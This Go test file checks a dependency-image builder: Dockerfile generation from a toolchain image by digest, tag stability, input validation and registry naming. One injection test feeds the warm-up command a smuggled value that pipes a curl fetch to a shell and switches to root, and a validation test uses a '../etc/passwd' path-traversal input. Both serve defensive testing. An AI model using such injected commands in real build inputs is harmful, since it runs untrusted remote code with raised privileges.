package images

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

func testDependencies() Dependencies {
	return Dependencies{
		Toolchain: Image{Repository: "toolchains/misarescu/frankie", Digest: "sha256:" + strings.Repeat("c", 64)},
		Files: map[string][]byte{"mise.toml": []byte("[tasks.\"deps:warm\"]\nrun = \"go mod download\"\n"), "go.mod": []byte("module x\n"),
			"go.sum": []byte("sum\n"), "web/bun.lock": []byte("lock\n")},
		Run: "mise run deps:warm",
	}
}

// M3.1: the dependency image builds on the recorded toolchain image, by digest
// from the in-cluster registry, with the declared files at their repo paths.
func TestDependenciesContext(t *testing.T) {
	cm, job, err := BuildResources(testConfig(), BuildRequest{Repository: "dependencies/misarescu/frankie", Spec: testDependencies()})
	if err != nil {
		t.Fatal(err)
	}
	files := contextFiles(t, cm)
	df := files["Dockerfile"]
	if !strings.HasPrefix(df, "FROM frankie-registry.frankie.svc:5000/toolchains/misarescu/frankie@sha256:cccc") {
		t.Errorf("Dockerfile does not start from the toolchain image by digest:\n%s", df)
	}
	run, _ := json.Marshal([]string{"/bin/sh", "-c", "cd /workspace/deps && mise run deps:warm"})
	if !strings.Contains(df, "COPY --chown=10001:10001 deps/ /workspace/deps/\n") || !strings.Contains(df, "RUN "+string(run)) {
		t.Errorf("Dockerfile does not copy the files and run the warm-up as the agent user:\n%s", df)
	}
	if files["deps/web/bun.lock"] != "lock\n" || files["deps/go.mod"] != "module x\n" || len(files) != 5 {
		t.Errorf("context = %v; want the declared files at their repo paths", files)
	}
	if !strings.HasPrefix(job.Name, "dp-") || !strings.Contains(strings.Join(job.Spec.Template.Spec.Containers[0].Args, " "),
		"name=frankie-registry.frankie.svc:5000/dependencies/misarescu/frankie,push=true,push-by-digest=true") {
		t.Errorf("job %s args %v", job.Name, job.Spec.Template.Spec.Containers[0].Args)
	}
}

// A warm-up command is data in the Dockerfile, never Dockerfile syntax.
func TestDependenciesRunCannotInjectDockerfileLines(t *testing.T) {
	d := testDependencies()
	d.Run = "true\nRUN curl evil | sh\nUSER root"
	files, err := d.Context("registry:5000", nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(string(files["Dockerfile"]), "\n") {
		if strings.HasPrefix(line, "USER") || strings.HasPrefix(line, "RUN curl") {
			t.Errorf("the warm-up command escaped into the Dockerfile: %q", line)
		}
	}
}

func TestDependenciesTag(t *testing.T) {
	base := testDependencies()
	if !strings.HasPrefix(base.Tag(), "dp-") || base.Tag() != testDependencies().Tag() {
		t.Fatalf("tag %q is not stable", base.Tag())
	}
	changes := map[string]func(*Dependencies){
		"a declared file":     func(d *Dependencies) { d.Files["go.sum"] = []byte("other\n") },
		"a new file":          func(d *Dependencies) { d.Files["web/package.json"] = []byte("{}") },
		"the toolchain":       func(d *Dependencies) { d.Toolchain.Digest = "sha256:" + strings.Repeat("d", 64) },
		"the warm-up":         func(d *Dependencies) { d.Run = "mise run deps:warm:all" },
		"bytes between files": func(d *Dependencies) { d.Files["go.mod"] = []byte("module x\nsum\n"); d.Files["go.sum"] = nil },
	}
	for name, change := range changes {
		d := testDependencies()
		change(&d)
		if d.Tag() == base.Tag() {
			t.Errorf("changing %s kept the tag", name)
		}
	}
}

func TestDependenciesValidate(t *testing.T) {
	tests := map[string]func(*Dependencies){
		"no toolchain digest":     func(d *Dependencies) { d.Toolchain.Digest = "latest" },
		"no files":                func(d *Dependencies) { d.Files = nil },
		"a path leaving the repo": func(d *Dependencies) { d.Files["../etc/passwd"] = []byte("x") },
		"too large":               func(d *Dependencies) { d.Files["big.lock"] = make([]byte, maxDependencyBytes+1) },
		"no warm-up":              func(d *Dependencies) { d.Run = " " },
	}
	for name, mutate := range tests {
		d := testDependencies()
		mutate(&d)
		if err := d.Validate(); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

// Ensure builds a dependency image like any other, recorded by digest.
func TestEnsureDependencyImage(t *testing.T) {
	e, b, _, d := newEnsurer()
	img, err := e.Ensure(context.Background(), "dependencies/misarescu/frankie", testDependencies())
	if err != nil {
		t.Fatal(err)
	}
	if !img.Built || img.Repository != "dependencies/misarescu/frankie" || !strings.HasPrefix(img.Ref, "localhost:30500/dependencies/misarescu/frankie@sha256:") ||
		d["dependencies/misarescu/frankie:"+testDependencies().Tag()] != img.Digest || len(b.builds) != 1 {
		t.Fatalf("image = %+v, recorded %v", img, d)
	}
	again, err := e.Ensure(context.Background(), "dependencies/misarescu/frankie", testDependencies())
	if err != nil || again.Built || again.Ref != img.Ref || len(b.builds) != 1 {
		t.Fatalf("unchanged dependencies: %+v, %v, builds %d", again, err, len(b.builds))
	}
}

func TestDependencyRepository(t *testing.T) {
	if r, err := DependencyRepository("misarescu/Goodreads-Clone"); err != nil || r != "dependencies/misarescu/goodreads-clone" {
		t.Errorf("DependencyRepository = %q, %v", r, err)
	}
}
